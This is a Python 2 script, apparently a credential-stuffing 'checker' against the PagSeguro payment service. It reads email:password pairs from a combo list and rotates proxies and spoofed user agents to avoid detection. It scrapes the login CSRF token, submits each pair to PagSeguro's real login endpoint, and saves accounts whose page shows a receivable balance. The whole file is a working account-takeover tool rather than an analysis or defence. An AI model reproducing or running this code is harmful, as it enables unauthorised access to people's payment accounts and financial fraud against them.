import requests
import random
import time
import re
from threading import Thread as thread

sessao = requests.Session();
sessao.mount('http://',requests.adapters.HTTPAdapter())
sessao.mount('https://', requests.adapters.HTTPAdapter())


try:
	COMBO_KEY = open(r'C:/Users/MICHEL/Desktop/projetos py/chkPagSeguro/comboList.txt','r')
except IOError:
	print 'Diretorio da Combo List nao foi encontrado.'

desktop_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0']
def random_headers():
    return {'User-Agent': random.choice(desktop_agents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
	
def getFormKey(sourceFont):
    m = re.search(r'"acsrfToken" value="(.*)"',sourceFont)
    form_key = m.group(1)
    return form_key

def selectProxy():
	try:
		proxys = open(r'C:/Users/MICHEL/Desktop/projetos py/chkPagSeguro/proxys.txt','r')
		list = []
		for i in proxys:
			i = i.rstrip()
			list.append(i)
		return random.choice(list).rstrip()
	except IOError:
		print 'Diretorio da proxylist nao foi encontrado.'

def validSave(email, senha):
	try:
		arqw = open('C:/Users/MICHEL/Desktop/projetos py/chkPagSeguro/validas.txt','w')
		arqw.write(email + ':' + senha)
		arqw.close()
	except IOError:
		print 'Diretorio para salvar contas validas nao foi encontrado'
	
def validProxy(proxy):
	print 'Buscando proxy'
	
	checkinProxy = ''
	MYIP = sessao.get('http://ipv4.icanhazip.com/')
	try:
		PROXY_VERIFY = sessao.get('http://ipv4.icanhazip.com/', proxies={'http':'http://' + proxy}, headers=random_headers() )
		checkinProxy = bool(re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",PROXY_VERIFY.content))
		while(checkinProxy == False or str(PROXY_VERIFY.content) == MYIP):
			PROXY_VERIFY = sessao.get('http://ipv4.icanhazip.com/', proxies={'http':'http://' + selectProxy()}, headers=random_headers() )
			checkinProxy = bool(re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",PROXY_VERIFY.content))
		return PROXY_VERIFY.content + ' ta boa? : ' + str(checkinProxy)
	except requests.ConnectionError, e:
		return False
		
def main():
	listaVerificados = []
	for lista in COMBO_KEY:
		EMAIL_EXPEC = ''
		PASS_EXPEC = ''
		PROXY_CORRECT = ''
		getProxy = False
		
		while (getProxy == False):
			getProxy = validProxy(selectProxy())

		lista = lista.rstrip();
		EMAIL_EXPEC = lista[:lista.find(':')].replace(' ','')
		PASS_EXPEC = lista[lista.find(':')+1:].replace(' ','')
		
		if EMAIL_EXPEC in listaVerificados:
			pass
		else:
			requisicaoGet = sessao.get('https://pagseguro.uol.com.br/acesso.jhtml')
			info = {'acsrfToken' : getFormKey(requisicaoGet.content),
					'skin' : 'ps',
					'dest' : 'REDIR|https://pagseguro.uol.com.br/hub.jhtml',
					'user' : EMAIL_EXPEC,
					'pass' : PASS_EXPEC} 
			print 'verificando: ' + EMAIL_EXPEC + ' com a proxy : ' + getProxy
			requisicaoPost = sessao.post('https://pagseguro.uol.com.br/login.jhtml',proxies= {'http':'http://' + getProxy },
										 data=info,allow_redirects=True);	
			listaVerificados.append(EMAIL_EXPEC)
			print 'verificou ' + EMAIL_EXPEC
			if 'Valor a receber' in requisicaoPost.content:		
				print('Opa a conta deu certo: ' + EMAIL_EXPEC)
				validSave(EMAIL_EXPEC, PASS_EXPEC)
			else:
				pass
		time.sleep(3)
print' 	 ______  ___  _____  _____ _____ _____ _   _______ _____ '
print'	 | ___ \/ _ \|  __ \/  ___|  ___|  __ \ | | | ___ \  _  |'
print'	 | |_/ / /_\ \ |  \/\ `--.| |__ | |  \/ | | | |_/ / | | |'
print'	 |  __/|  _  | | __  `--. \  __|| | __| | | |    /| | | |'
print'	 | |   | | | | |_\ \/\__/ / |___| |_\ \ |_| | |\ \\ \_/ /'
print'	 \_|   \_| |_/\____/\____/\____/ \____/\___/\_| \_|\___/ '


main()
